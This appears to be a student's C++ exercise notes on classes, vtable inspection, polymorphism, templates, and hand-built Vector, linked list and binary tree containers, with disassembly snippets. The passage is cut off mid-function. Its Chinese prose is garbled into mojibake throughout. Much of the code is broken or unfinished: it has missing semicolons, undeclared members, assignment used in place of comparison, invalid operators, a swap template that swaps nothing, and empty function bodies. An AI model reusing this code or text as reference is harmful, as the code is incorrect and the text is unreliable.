å°†ä¸Šä¸€èŠ‚è¯¾çš„æ‰€æœ‰ç»ƒä¹ æ”¹ä¸ºclasså®ç°\næ·»åŠ private/publicè¿›è¡Œæƒé™æ§åˆ¶ å°†ç±»çš„å®šä¹‰ä¸å®ç°åˆ†å¼€æ¥å†™ï¼šå®šä¹‰å†™åˆ°xxx.hä¸­ï¼Œå‡½æ•°å®ç°å†™åœ¨xxx.cppä¸­ //xxx.h struct DateInfo { private: int year; int month; int day; public: DateInfo(int year,int month,int day) { this -\u003e year = year; this -\u003e month = month; this -\u003e day = day; } DateInfo() { this -\u003e year = 2015; this -\u003e month = 4; this -\u003e day = 2; } void SetDay(int day) int GetDay() void SetYear(int year) int GetYear() void SetMonth(int month) int GetMonth() } struct TimeInfo:public DateInfo { private: int hour; int minute; int second; public: TimeInfo(int hour,int minute,int second) { this -\u003e hour= hour; this -\u003e minute= minute; this -\u003e second= second; } void GetHour() void GetMinute() void GetSecond() } //xxx.cpp void DataInfo::SetDay(int day) { this -\u003e day = day; } int DataInfo::GetDay() { return this -\u003e day; } void DataInfo::SetYear(int year) { this -\u003e year = year; } int DataInfo::GetYear() { return this -\u003e year; } void DataInfo::SetMonth(int month) { this -\u003e month = month; } int DataInfo::GetMonth() { return this -\u003e month; } void TimeInfo::GetHour() { return this -\u003e hour; } void TimeInfo::GetMinute() { return this -\u003e minute; } void TimeInfo::GetSecond() { return this -\u003e second; } è™šå‡½æ•° int main() { Sub sub; void** vtable = *(void***)\u0026sub; printf(\"base :%p\\n\",vtable); for(int i = 0; i \u003c 9; i++) { printf(\"[%d]: %p\\n\", i, vtable[i]); } return 0; } å•ç»§æ‰¿æ— å‡½æ•°è¦†ç›–ï¼ˆæ‰“å°Subå¯¹è±¡çš„è™šå‡½æ•°è¡¨ï¼‰\nstruct Base { public: virtual void Function_1() { printf(\"Base:Function_1...\\n\"); } virtual void Function_2() { printf(\"Base:Function_2...\\n\"); } virtual void Function_3() { printf(\"Base:Function_3...\\n\"); } }; struct Sub:Base { public: virtual void Function_4() { printf(\"Sub:Function_4...\\n\"); } virtual void Function_5() { printf(\"Sub:Function_5...\\n\"); } virtual void Function_6() { printf(\"Sub:Function_6...\\n\"); } }; base :00007ff77ca73c80 [0]: 00007ff77ca71a90 [1]: 00007ff77ca71ab0 [2]: 00007ff77ca71ad0 [3]: 00007ff77ca71a30 [4]: 00007ff77ca71a50 [5]: 00007ff77ca71a70 [6]: 0000000000000000 [7]: 00007ff77ca73b60 [8]: 00007ff77ca719e0 å•ç»§æ‰¿æœ‰å‡½æ•°è¦†ç›–ï¼ˆæ‰“å°Subå¯¹è±¡çš„è™šå‡½æ•°è¡¨ï¼‰\nstruct Base { public: virtual void Function_1() { printf(\"Base:Function_1...\\n\"); } virtual void Function_2() { printf(\"Base:Function_2...\\n\"); } virtual void Function_3() { printf(\"Base:Function_3...\\n\"); } }; struct Sub:Base { public: virtual void Function_1() { printf(\"Sub:Function_1...\\n\"); } virtual void Function_2() { printf(\"Sub:Function_2...\\n\"); } virtual void Function_6() { printf(\"Sub:Function_6...\\n\"); } }; base :00007ff78c643c60 [0]: 00007ff78c641a30 [1]: 00007ff78c641a50 [2]: 00007ff78c641a90 [3]: 00007ff78c641a70 [4]: 0000000000000000 [5]: 00007ff78c643b40 [6]: 00007ff78c6419e0 [7]: 00007ff78c6419b0 [8]: 00007ff78c641e50 ä¼¼ä¹ç»§æ‰¿äº†é‡å†™çš„è™šå‡½æ•°ä¸ä¼šå‡ºç°åœ¨è™šè¡¨ä¸­ï¼Ÿ\nåŠ¨æ€ç»‘å®š å†™ä¸€ä¸ªä¾‹å­ç¨‹åºï¼Œèƒ½ä½“ç°å¤šæ€çš„ä½œç”¨\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e class Animal { public: virtual void makeSound() { printf(\"mo ren\\n\"); } }; class Dog : public Animal { public: void makeSound() override { printf(\"wang wang\\n\"); } }; class Cat : public Animal { public: void makeSound() override { printf(\"miao miao\\n\"); } }; int main() { Animal* animalPtr; Dog dog; Cat cat; animalPtr = \u0026dog; animalPtr-\u003emakeSound(); // è¾“å‡º \"wang wang\" animalPtr = \u0026cat; animalPtr-\u003emakeSound(); // è¾“å‡º \"miao miao\" return 0; } æ¨¡æ¿ ä½¿ç”¨æ¨¡ç‰ˆå®ç°swap(x,y)å‡½æ•°ï¼ŒåŠŸèƒ½ï¼šäº¤æ¢xï¼Œyçš„å€¼\ntemplate\u003cclass I\u003e void swap(I x,I y) { I temp = x; x = y; y = temp; } å†’æ³¡æ’åºï¼šå¯¹ç»“æ„ä½“æˆ–è€…ç±»è¿›è¡Œæ’åºï¼Œå¦‚æœä¸èƒ½å®ç°ï¼Œæ‰¾å‡ºé—®é¢˜æ‰€åœ¨\n//æ­£å¸¸å†’æ³¡æ’åº void Sort(int* arr,int nLength) { int i; int k; for(i=0;i\u003cnLength-1;i++) { for(k=0;k\u003cnLength-1-i;k++) { if(arr[k]\u003earr[k+1]) { int temp = arr[k]; arr[k] = arr[k+1]; arr[k+1] = temp; } } } } åœ¨ä»£ç ä¸­if(arr[k]\u003earr[k+1])ä¸­çš„\u003eå·æ— æ³•å¯¹ç±»æˆ–ç»“æ„ä½“è¿›è¡Œæ¯”è¾ƒã€‚\nè§‚å¯Ÿä¸‹é¢ä¸¤ä¸ªSortæ–¹æ³•çš„åæ±‡ç¼–ä»£ç ï¼ˆçœ‹å†…å­˜åœ°å€å’Œå†…å®¹ï¼‰ï¼š\nint arr[] = {2,6,1,5,4}; char arr1[] = {2,6,1,5,4}; Sort(arr,5); Sort(arr1,5); .text:0000000140001640 mov [rbp+var_20], 2 .text:0000000140001647 mov [rbp+var_1C], 6 .text:000000014000164E mov [rbp+var_18], 1 .text:0000000140001655 mov [rbp+var_14], 5 .text:000000014000165C mov [rbp+var_10], 4 .text:0000000140001663 mov [rbp+var_25], 5010602h ;'\\x05\\x01\\x06\\x02' .text:000000014000166A mov [rbp+var_21], 4 .text:000000014000166E lea rax, [rbp+var_20] .text:0000000140001672 mov edx, 5 .text:0000000140001677 mov rcx, rax .text:000000014000167A call Sort .text:000000014000167F lea rax, [rbp+var_25] .text:0000000140001683 mov edx, 5 .text:0000000140001688 mov rcx, rax .text:000000014000168B call Sort .text:0000000140001690 mov eax, 0 .text:0000000140001695 add rsp, 50h .text:0000000140001699 pop rbp .text:000000014000169A retn å¼•ç”¨-å‹å…ƒ-è¿ç®—ç¬¦é‡è½½ å®šä¹‰ä¸€ä¸ªç±»ï¼Œä½¿ç”¨å‹å…ƒå‡½æ•°å®ç°ï¼š+ã€-ã€*ã€/ã€\u003eã€\u003cã€\u003e=ã€\u003c=ç­‰è¿ç®—ç¬¦é‡è½½ï¼ˆä»€ä¹ˆæƒ…å†µä¸‹ï¼Œä¸€å®šè¦ç”¨å‹å…ƒå‡½æ•°?ï¼‰\nclass Test { private: int x; int y; public: Test(int x,int y); friend Test operator+(const Test\u0026 p1, const Test\u0026 p2); friend Test operator-(const Test\u0026 p1, const Test\u0026 p2); friend Test operator*(const Test\u0026 p1, const Test\u0026 p2); friend Test operator/(const Test\u0026 p1, const Test\u0026 p2); friend bool operator\u003e(const Test\u0026 p1, const Test\u0026 p2); friend bool operator\u003c(const Test\u0026 p1, const Test\u0026 p2); friend bool operator\u003e=(const Test\u0026 p1, const Test\u0026 p2); friend bool operator\u003c=(const Test\u0026 p1, const Test\u0026 p2); }; Test::Test(int x,int y) { this -\u003e x = x; this -\u003e y = y; } Test operator+(const Test\u0026 p1, const Test\u0026 p2) { return Test(p1.x + p2.x, p1.y + p2.y); } Test operator-(const Test\u0026 p1, const Test\u0026 p2) { return Test(p1.x - p2.x, p1.y - p2.y); } Test operator*(const Test\u0026 p1, const Test\u0026 p2) { return Test(p1.x * p2.x, p1.y * p2.y); } Test operator/(const Test\u0026 p1, const Test\u0026 p2) { if (p2.x == 0 || p2.y == 0) { return Test(0, 0); } return Test(p1.x / p2.x, p1.y / p2.y); } bool operator\u003e(const Test\u0026 p1, const Test\u0026 p2) { return p1.x \u003e p2.x \u0026\u0026 p1.y \u003e p2.y; } bool operator\u003c(const Test\u0026 p1, const Test\u0026 p2) { return p1.x \u003c p2.x \u0026\u0026 p1.y \u003c p2.y; } bool operator\u003e=(const Test\u0026 p1, const Test\u0026 p2) { return p1.x \u003e= p2.x \u0026\u0026 p1.y \u003e= p2.y; } bool operator\u003c=(const Test\u0026 p1, const Test\u0026 p2) { return p1.x \u003c= p2.x \u0026\u0026 p1.y \u003c= p2.y; } int main() { Test t1; Test t2; int add; add = t1 + t2; return 0; } ä»åæ±‡ç¼–çš„è§’åº¦è¯´è¯´å¼•ç”¨ä¸æŒ‡é’ˆçš„åŒºåˆ«\nä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«\næ•°æ®ç»“æ„ Vector å®ç°ä¸€ä¸ªVectorç±»\n#define SUCCESS 1 // æˆåŠŸ #define ERROR -1 // å¤±è´¥ #define MALLOC_ERROR\t-2 // ç”³è¯·å†…å­˜å¤±è´¥ #define INDEX_ERROR\t-3 // é”™è¯¯çš„ç´¢å¼•å· template \u003cclass T_ELE\u003e class Vector { public: Vector(); Vector(DWORD dwSize); ~Vector(); public: DWORD\tat(DWORD dwIndex,OUT T_ELE* pEle);\t//æ ¹æ®ç»™å®šçš„ç´¢å¼•å¾—åˆ°å…ƒç´ \tDWORD push_back(T_ELE Element);\t//å°†å…ƒç´ å­˜å‚¨åˆ°å®¹å™¨æœ€åä¸€ä¸ªä½ç½® VOID\tpop_back();\t//åˆ é™¤æœ€åä¸€ä¸ªå…ƒç´ \tDWORD\tinsert(DWORD dwIndex, T_ELE Element);\t//å‘æŒ‡å®šä½ç½®æ–°å¢ä¸€ä¸ªå…ƒç´ \tDWORD\tcapacity();\t//è¿”å›åœ¨ä¸å¢å®¹çš„æƒ…å†µä¸‹ï¼Œè¿˜èƒ½å­˜å‚¨å¤šå°‘å…ƒç´  VOID\tclear();\t//æ¸…ç©ºæ‰€æœ‰å…ƒç´ \tBOOL\tempty();\t//åˆ¤æ–­Vectoræ˜¯å¦ä¸ºç©º è¿”å›trueæ—¶ä¸ºç©º VOID\terase(DWORD dwIndex);\t//åˆ é™¤æŒ‡å®šå…ƒç´ \tDWORD\tsize();\t//è¿”å›Vectorå…ƒç´ æ•°é‡çš„å¤§å°\tprivate: BOOL\texpand();\tprivate: DWORD m_dwIndex;\t//ä¸‹ä¸€ä¸ªå¯ç”¨ç´¢å¼•\tDWORD m_dwIncrement;\t//æ¯æ¬¡å¢å®¹çš„å¤§å°\tDWORD m_dwLen;\t//å½“å‰å®¹å™¨çš„é•¿åº¦ DWORD m_dwInitSize;\t//é»˜è®¤åˆå§‹åŒ–å¤§å°\tT_ELE *m_pVector;\t//å®¹å™¨æŒ‡é’ˆ\t}; template \u003cclass T_ELE\u003e Vector\u003cT_ELE\u003e::Vector():m_dwInitSize(100),m_dwIncrement(5) { //é»˜è®¤åˆå§‹åŒ–å¤§å°\t//æ¯æ¬¡å¢å®¹çš„å¤§å° //1.åˆ›å»ºé•¿åº¦ä¸ºm_dwInitSizeä¸ªT_ELEå¯¹è±¡ m_Obj = new T_ELE[m_dwInitSize]; //2.å°†æ–°åˆ›å»ºçš„ç©ºé—´åˆå§‹åŒ– memset(m_Obj,0,m_dwInitSize*sizeof(T_ELE)); //3.è®¾ç½®å…¶ä»–å€¼ m_dwIndex = 0; m_dwInitSize = m_dwInitSize; //å¯èƒ½åˆå§‹åŒ–çš„å¤§å°æ˜¯æŒ‰ç…§ä¸€ä¸ªæˆå‘˜ä¸ºå•ä½çš„ï¼Œæ‰€ä»¥å°±ä¸ç”¨ä¹˜sizeof(T_ELE)å§ } template \u003cclass T_ELE\u003e Vector\u003cT_ELE\u003e::Vector(DWORD dwSize):m_dwIncrement(5) { //1.åˆ›å»ºé•¿åº¦ä¸ºdwSizeä¸ªT_ELEå¯¹è±¡ m_Obj = new T_ELE[dwSize]; //2.å°†æ–°åˆ›å»ºçš„ç©ºé—´åˆå§‹åŒ– memset(m_Obj,0,dwSize*sizeof(T_ELE)); //3.è®¾ç½®å…¶ä»–å€¼ m_dwIndex=0; m_dwLen = dwSize; } template \u003cclass T_ELE\u003e Vector\u003cT_ELE\u003e::~Vector() { //é‡Šæ”¾ç©ºé—´ delete[] delete[] m_Obj; m_Obj = NULL; //é˜²uaf } template \u003cclass T_ELE\u003e BOOL Vector\u003cT_ELE\u003e::expand() { // 1. è®¡ç®—å¢åŠ åçš„é•¿åº¦ = å½“å‰å®¹å™¨çš„é•¿åº¦ + æ¯æ¬¡å¢å®¹çš„å¤§å° int added = m_dwLen + m_dwIncrement; // 2. ç”³è¯·ç©ºé—´ T_ELE* addr = new T_ELE[added]; //æŒ‡å‘ T_ELE ç±»å‹æ•°æ®çš„æŒ‡é’ˆ // 3. å°†æ•°æ®å¤åˆ¶åˆ°æ–°çš„ç©ºé—´ memcpy(addr,m_Obj,m_dwInitSize*sizeof(T_ELE)); // 4. é‡Šæ”¾åŸæ¥ç©ºé—´ delete[] m_Obj; // 5. ä¸ºå„ç§å±æ€§èµ‹å€¼ m_Obj = addr; addr = NULL; m_dwLen = added; return SUCCESS; } template \u003cclass T_ELE\u003e DWORD Vector\u003cT_ELE\u003e::push_back(T_ELE Element) { //1.åˆ¤æ–­æ˜¯å¦éœ€è¦å¢å®¹ï¼Œå¦‚æœéœ€è¦å°±è°ƒç”¨å¢å®¹çš„å‡½æ•° if(m_dwIndex\u003e=m_dwLen) { expand(); } //2.å°†æ–°çš„å…ƒç´ å¤åˆ¶åˆ°å®¹å™¨çš„æœ€åä¸€ä¸ªä½ç½® memcpy(\u0026m_Obj[m_dwIndex],\u0026Element,sizeof(T_ELE)); //3.ä¿®æ”¹å±æ€§å€¼ m_dwIndex++; return SUCCESS; } template \u003cclass T_ELE\u003e DWORD Vector\u003cT_ELE\u003e::insert(DWORD dwIndex, T_ELE Element) //å‘æŒ‡å®šä½ç½®æ–°å¢ä¸€ä¸ªå…ƒç´  { //1.åˆ¤æ–­æ˜¯å¦éœ€è¦å¢å®¹ï¼Œå¦‚æœéœ€è¦å°±è°ƒç”¨å¢å®¹çš„å‡½æ•° if(m_dwIndex\u003e=m_dwLen) { expand(); } //2.åˆ¤æ–­ç´¢å¼•æ˜¯å¦åœ¨åˆç†åŒºé—´ if(dwIndex \u003c 0 || dwIndex \u003e m_dwIndex) { return INDEX_ERROR; } //3.å°†dwIndexä¹‹åçš„å…ƒç´ åç§» memcpy(((int*)(\u0026m_Obj[dwIndex]))+1,\u0026m_Obj[dwIndex],sizeof(T_ELE)*(m_dwIndex-dwIndex)); //4.å°†Elementå…ƒç´ å¤åˆ¶åˆ°dwIndexä½ç½® memcpy(\u0026m_pVector[dwIndex],\u0026Element,sizeof(T_ELE)); //5.ä¿®æ”¹å±æ€§å€¼ dwIndex++; return SUCCESS; } template \u003cclass T_ELE\u003e DWORD Vector\u003cT_ELE\u003e::at(DWORD dwIndex,T_ELE* pEle) //æ ¹æ®ç»™å®šçš„ç´¢å¼•å¾—åˆ°å…ƒç´  { //åˆ¤æ–­ç´¢å¼•æ˜¯å¦åœ¨åˆç†åŒºé—´ if(dwIndex \u003c 0 || dwIndex \u003e m_dwIndex) { return INDEX_ERROR; } //å°†dwIndexçš„å€¼å¤åˆ¶åˆ°pEleæŒ‡å®šçš„å†…å­˜ memcpy(pEle,m_Obj[dwIndex],sizeof(T_ELE)); } //å…¶ä»–å‡½æ•°ã€‚ã€‚è‡ªå·±å®ç° è¯»æ‡‚æ¯ä¸€ä¸ªæ–¹æ³•çš„åæ±‡ç¼–å®ç°\né“¾è¡¨ å®ç°ä¸€ä¸ªå•é¡¹é“¾è¡¨\n#define SUCCESS 1 // æ‰§è¡ŒæˆåŠŸ #define ERROR -1 // æ‰§è¡Œå¤±è´¥ #define INDEX_IS_ERROR -2 // é”™è¯¯çš„ç´¢å¼•å· #define BUFFER_IS_EMPTY -3 // ç¼“å†²åŒºå·²ç©º template \u003cclass T_ELE\u003e class LinkedList { public: LinkedList(); ~LinkedList(); public: BOOL IsEmpty();\t//åˆ¤æ–­é“¾è¡¨æ˜¯å¦ä¸ºç©º ç©ºè¿”å›1 éç©ºè¿”å›0 void Clear();\t//æ¸…ç©ºé“¾è¡¨ DWORD GetElement(IN DWORD dwIndex,OUT T_ELE\u0026 Element);\t//æ ¹æ®ç´¢å¼•è·å–å…ƒç´  DWORD GetElementIndex(IN T_ELE\u0026 Element);\t//æ ¹æ®å…ƒç´ è·å–é“¾è¡¨ä¸­çš„ç´¢å¼• DWORD Insert(IN T_ELE Element);\t//æ–°å¢å…ƒç´  DWORD Insert(IN DWORD dwIndex, IN T_ELE Element);\t//æ ¹æ®ç´¢å¼•æ–°å¢å…ƒç´  DWORD Delete(IN DWORD dwIndex);\t//æ ¹æ®ç´¢å¼•åˆ é™¤å…ƒç´  DWORD GetSize();\t//è·å–é“¾è¡¨ä¸­å…ƒç´ çš„æ•°é‡ private: typedef struct _NODE { T_ELE Data; _NODE *pNext; }NODE,*PNODE; PNODE GetIndexCurrentNode(DWORD dwIndex);\t//è·å–ç´¢å¼•ä¸ºdwIndexçš„æŒ‡é’ˆ PNODE GetIndexPreviousNode(DWORD dwIndex);\t//è·å–ç´¢å¼•ä¸ºdwIndexçš„å‰ä¸€ä¸ªèŠ‚ç‚¹æŒ‡é’ˆ PNODE GetIndexNextNode(DWORD dwIndex);\t//è·å–ç´¢å¼•ä¸ºdwIndexçš„åä¸€ä¸ªèŠ‚ç‚¹æŒ‡é’ˆ private: PNODE m_pList;\t//é“¾è¡¨å¤´æŒ‡é’ˆï¼ŒæŒ‡å‘ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ DWORD m_dwLength;\t//å…ƒç´ çš„æ•°é‡ }; //æ— å‚æ„é€ å‡½æ•° åˆå§‹åŒ–æˆå‘˜ template\u003cclass T_ELE\u003e LinkedList\u003cT_ELE\u003e::LinkedList():m_pList(NULL),m_dwLength(0) { } //ææ„å‡½æ•° æ¸…ç©ºå…ƒç´  template\u003cclass T_ELE\u003e LinkedList\u003cT_ELE\u003e::~LinkedList() { Clear(); } //åˆ¤æ–­é“¾è¡¨æ˜¯å¦ä¸ºç©º template\u003cclass T_ELE\u003e BOOL LinkedList\u003cT_ELE\u003e::IsEmpty() { if(m_pList = 0 || m_dwLength = 0) { return SUCCESS; } else { return 0; } } //æ¸…ç©ºé“¾è¡¨ template\u003cclass T_ELE\u003e void LinkedList\u003cT_ELE\u003e::Clear() { // 1. åˆ¤æ–­é“¾è¡¨æ˜¯å¦ä¸ºç©º if(IsEmpty() == SUCCESS) { printf(\"BUFFER_IS_EMPTY\"); } else { // 2. å¾ªç¯åˆ é™¤é“¾è¡¨ä¸­çš„èŠ‚ç‚¹ NODE* pList = m_pList; NODE* pDelete = NULL; for(int i = 0;i \u003c m_dwLength;i++) { pDelete = pList; pList = pList -\u003e pNext; delete pDelete; } // 3. åˆ é™¤æœ€åä¸€ä¸ªèŠ‚ç‚¹å¹¶å°†é“¾è¡¨é•¿åº¦ç½®ä¸º0 delete pList; m_dwLength = 0; } } //æ ¹æ®ç´¢å¼•è·å–å…ƒç´  template\u003cclass T_ELE\u003e DWORD LinkedList\u003cT_ELE\u003e::GetElement(IN DWORD dwIndex,OUT T_ELE\u0026 Element) { // 1. åˆ¤æ–­ç´¢å¼•æ˜¯å¦æœ‰æ•ˆ if(dwIndex \u003c 0 || dwIndex \u003e m_dwLength) { return INDEX_IS_ERROR; } // 2. å–å¾—ç´¢å¼•æŒ‡å‘çš„èŠ‚ç‚¹ NODE* pList1 = m_pList; for(int i = 0;i \u003c dwIndex;i++) { pList1 = pList1 -\u003e pNext; } // 3. å°†ç´¢å¼•æŒ‡å‘èŠ‚ç‚¹çš„å€¼å¤åˆ¶åˆ°OUTå‚æ•° Element pList1 -\u003e pNext; return SUCCESS; } //æ ¹æ®å…ƒç´ å†…å®¹è·å–ç´¢å¼• template\u003cclass T_ELE\u003e DWORD LinkedList\u003cT_ELE\u003e::GetElementIndex(IN T_ELE\u0026 Element) { // 1. åˆ¤æ–­é“¾è¡¨æ˜¯å¦ä¸ºç©º if(IsEmpty() == SUCCESS) { return BUFFER_IS_EMPTY; } // 2. å¾ªç¯éå†é“¾è¡¨ï¼Œæ‰¾åˆ°ä¸Elementç›¸åŒçš„å…ƒç´  for(int i = 0;i \u003c m_dwLength;i++) { if(pList1 -\u003e Data ==Element) { Index = i; } else { pList1 = pList1 -\u003e pNext; } } return Index; } //åœ¨é“¾è¡¨å°¾éƒ¨æ–°å¢èŠ‚ç‚¹ template\u003cclass T_ELE\u003e DWORD LinkedList\u003cT_ELE\u003e::Insert(IN T_ELE Element) { NODE* pNewNode = new NODE; memset(pNewNode,0,sizeof(NODE)); memcpy(\u0026pNewNode -\u003e Data,\u0026Element,sizeof(T_ELE)); // 1. åˆ¤æ–­é“¾è¡¨æ˜¯å¦ä¸ºç©º if(IsEmpty() == SUCCESS) { m_pList = pNewNode; m_dwLength++; return SUCCESS; } // 2. å¦‚æœé“¾è¡¨ä¸­å·²ç»æœ‰å…ƒç´  NODE* TempNODE = m_pList; for(int i = 0;i \u003c m_dwLength - 1;i++) { TempNODE = TempNODE -\u003e pNext; } TempNODE -\u003e pNext = pNewNode; m_dwLength++; return SUCCESS; } //å°†èŠ‚ç‚¹æ–°å¢åˆ°æŒ‡å®šç´¢å¼•çš„ä½ç½® template\u003cclass T_ELE\u003e DWORD LinkedList\u003cT_ELE\u003e::Insert(IN DWORD dwIndex, IN T_ELE Element) { NODE* pNewList = new NODE; memset(pNewList, 0, sizeof(NODE)); memcpy(pNewList, \u0026Element, sizeof(T_ELE)); // 1. åˆ¤æ–­é“¾è¡¨æ˜¯å¦ä¸ºç©º if(IsEmpty() == SUCCESS) { m_pList = pNewList; m_dwLength++; return SUCCESS; } // 2. åˆ¤æ–­ç´¢å¼•å€¼æ˜¯å¦æœ‰æ•ˆ if (dwIndex \u003c0 || dwIndex \u003e m_dwLength) { return INDEX_IS_ERROR; } // 3. å¦‚æœç´¢å¼•ä¸º0 if (dwIndex == 0) { pNewList -\u003e pNext = m_pList; m_pList = pNewList; m_dwLength++; return SUCCESS; } // 4. å¦‚æœç´¢å¼•ä¸ºé“¾è¡¨å°¾ NODE* pList1 = m_pList; for (int i = 0; i \u003c m_dwLength - 1; i++) { pList1 = pList1 -\u003e pNext; } pList1 -\u003e pNext = pNewList; m_dwLength++; // 5. å¦‚æœç´¢å¼•ä¸ºé“¾è¡¨ä¸­ } //æ ¹æ®ç´¢å¼•åˆ é™¤èŠ‚ç‚¹ template\u003cclass T_ELE\u003e DWORD LinkedList\u003cT_ELE\u003e::Delete(IN DWORD dwIndex) { // 1. åˆ¤æ–­é“¾è¡¨æ˜¯å¦ä¸ºç©º if(IsEmpty() == SUCCESS) { return BUFFER_IS_EMPTY; } // 2. åˆ¤æ–­ç´¢å¼•å€¼æ˜¯å¦æœ‰æ•ˆ if (dwIndex \u003c0 || dwIndex \u003e m_dwLength) { return INDEX_IS_ERROR; } // 3. å¦‚æœé“¾è¡¨ä¸­åªæœ‰å¤´èŠ‚ç‚¹ï¼Œä¸”è¦åˆ é™¤å¤´èŠ‚ç‚¹ if (m_pList -\u003e pNext == NULL \u0026\u0026 dwIndex == 0) { delete m_pList; m_dwLength--; return SUCCESS; } // 4. å¦‚æœè¦åˆ é™¤å¤´èŠ‚ç‚¹ if (dwIndex == 0) { NODE* pTemp = m_pList; m_pList = m_pList -\u003e pNext; delete pTemp; m_dwLength--; return SUCCESS; } // 5. å¦‚æœæ˜¯å…¶ä»–æƒ…å†µ else { NODE* pNList = m_pList; GetIndexPreviousNode(dwIndex) -\u003e pNext = GetIndexCurrentNode(dwIndex) -\u003e pNext; delete GetIndexCurrentNode(dwIndex); m_dwLength--; } } //è·å–é“¾è¡¨ä¸­èŠ‚ç‚¹çš„æ•°é‡ template\u003cclass T_ELE\u003e DWORD LinkedList\u003cT_ELE\u003e::GetSize() { } //è·å–dwIndexå‰é¢èŠ‚ç‚¹çš„åœ°å€ template\u003cclass T_ELE\u003e LinkedList\u003cT_ELE\u003e::PNODE LinkedList\u003cT_ELE\u003e::GetIndexPreviousNode(DWORD dwIndex) { // å°±æ˜¯ä¸€ä¸ªå¾ªç¯ } //è·å–dwIndexèŠ‚ç‚¹çš„åœ°å€ template\u003cclass T_ELE\u003e LinkedList\u003cT_ELE\u003e::PNODE LinkedList\u003cT_ELE\u003e::GetIndexCurrentNode(DWORD dwIndex) { // å°±æ˜¯ä¸€ä¸ªå¾ªç¯ } //è·å–dwIndexåé¢èŠ‚ç‚¹çš„åœ°å€ template\u003cclass T_ELE\u003e LinkedList\u003cT_ELE\u003e::PNODE LinkedList\u003cT_ELE\u003e::GetIndexNextNode(DWORD dwIndex) {\t// å°±æ˜¯ä¸€ä¸ªå¾ªç¯ } è¯»æ‡‚æ¯ä¸€ä¸ªæ–¹æ³•çš„åæ±‡ç¼–å®ç°\näºŒå‰æ ‘ éå†äºŒå‰æ ‘ä¸­çš„æ€ªç‰©åˆ—è¡¨\nå®Œæˆææ„å‡½æ•°ä¸­çš„ä»£ç \ngraph TD A[5] --\u003e B[4] A --\u003e C[6] B --\u003e D[1] B --\u003e E[NULL] C --\u003e F[3] C --\u003e G[NULL] D --\u003e H[NULL] D --\u003e I[2] F --\u003e J[NULL] F --\u003e K[7] class Monster { public: int ID; int Level; char Name[20]; public: Monster(){} Monster(int ID,int Level,char* Name) { this-\u003eID = ID; this-\u003eLevel = Level; memcpy(\u0026this-\u003eName,Name,strlen(Name)+1); } }; template\u003cclass T\u003e class TreeNode{ public: T element;\t//å½“å‰èŠ‚ç‚¹å­˜å‚¨çš„æ•°æ® TreeNode\u003cT\u003e* pLeft;\t//æŒ‡å‘å·¦å­èŠ‚ç‚¹çš„æŒ‡é’ˆ TreeNode\u003cT\u003e* pRight;\t//æŒ‡å‘å³å­èŠ‚ç‚¹çš„æŒ‡é’ˆ TreeNode(T\u0026 ele){ //åˆå§‹åŒ–NodeèŠ‚ç‚¹ memset(\u0026element,0,sizeof(TreeNode)); //ä¸ºå…ƒç´ èµ‹å€¼ memcpy(\u0026element,\u0026ele,sizeof(T)); pLeft = pRight = NULL; } }; template\u003cclass T\u003e class BSortTree{ public: BSortTree();\t//æ„é€ å‡½æ•° ~BSortTree();\t//ææ„å‡½æ•° public: void InOrderTraverse(TreeNode\u003cT\u003e* pNode);\t//ä¸­åºéå† void PreOrderTraverse(TreeNode\u003cT\u003e* pNode);\t//å‰åºéå† void PostOrderTraverse(TreeNode\u003cT\u003e* pNode);\t//ååºéå† TreeNode\u003cT\u003e* GetRoot();\t//è¿”å›æ ¹èŠ‚ç‚¹ int GetDepth(TreeNode\u003cT\u003e* pNode);\t//è¿”å›æŸä¸ªèŠ‚ç‚¹çš„é«˜åº¦/æ·±åº¦ private: void Init(); private: TreeNode\u003cT\u003e* m_pRoot;\t//æ ¹ç»“ç‚¹æŒ‡é’ˆ int size;\t//æ ‘ä¸­å…ƒç´ æ€»ä¸ªæ•° }; template\u003cclass T\u003e BSortTree\u003cT\u003e::BSortTree() { Init(); } template\u003cclass T\u003e BSortTree\u003cT\u003e::~BSortTree(){ //é‡Šæ”¾æ‰€æœ‰èŠ‚ç‚¹ç©ºé—´ Clear(m_pRoot); }\ttemplate\u003cclass T\u003e void BSortTree\u003cT\u003e::Init() { Monster m1(1,1,\"åˆºçŒ¬\"); Monster m2(2,2,\"é‡ç‹¼\"); Monster m3(3,3,\"é‡çŒª\"); Monster m4(4,4,\"å£«å…µ\"); Monster m5(5,5,\"ç«é¾™\"); Monster m6(6,6,\"ç‹¬è§’å…½\"); Monster m7(7,7,\"æ±Ÿæ¹–å¤§ç›—\"); TreeNode\u003cMonster\u003e* n1 = new TreeNode\u003cMonster\u003e(m1); TreeNode\u003cMonster\u003e* n2 = new TreeNode\u003cMonster\u003e(m2); TreeNode\u003cMonster\u003e* n3 = new TreeNode\u003cMonster\u003e(m3); TreeNode\u003cMonster\u003e* n4 = new TreeNode\u003cMonster\u003e(m4); TreeNode\u003cMonster\u003e* n5 = new TreeNode\u003cMonster\u003e(m5); TreeNode\u003cMonster\u003e* n6 = new TreeNode\u003cMonster\u003e(m6); TreeNode\u003cMonster\u003e* n7 = new TreeNode\u003cMonster\u003e(m7); m_pRoot = n5; n5-\u003epLeft = n4; n5-\u003epRight = n6; n4-\u003epLeft = n1; n1-\u003epRight = n2; n6-\u003epLeft = n3; n3-\u003epRight = n7; size = 7; } template\u003cclass T\u003e TreeNode\u003cT\u003e* BSortTree\u003cT\u003e::Clear(TreeNode\u003cT\u003e* pNode) { if(pNode != 0) { Clear(pNode -\u003e pLeft); Clear(pNode -\u003e pRight); delete pNode; pNode = NULL; } } template\u003cclass T\u003e TreeNode\u003cT\u003e* BSortTree\u003cT\u003e::GetRoot() { return m_pRoot; } template\u003cclass T\u003e int BSortTree\u003cT\u003e::GetDepth(TreeNode\u003cT\u003e* pNode) { if(pNode==NULL) { return 0; } else { int m = GetDepth(pNode-\u003epLeft); int n = GetDepth(pNode-\u003epRight); return (m \u003e n) ? (m+1) : (n+1); } } template\u003cclass T\u003e void BSortTree\u003cT\u003e::InOrderTraverse(TreeNode\u003cT\u003e* pNode) { //ä¸­åºéå†æ‰€æœ‰æ€ªç‰©,åˆ—å‡ºæ€ªçš„åå­— if(pNode!==NULL) { InOrderTraverse(pNode -\u003e pLeft); pName = (char*)\u0026pNode -\u003e element; pName = pName + 8; printf(\"%d\\n\",pName); InOrderTraverse(pNode -\u003e pRight); } } template\u003cclass T\u003e void BSortTree\u003cT\u003e::PreOrderTraverse(TreeNode\u003cT\u003e* 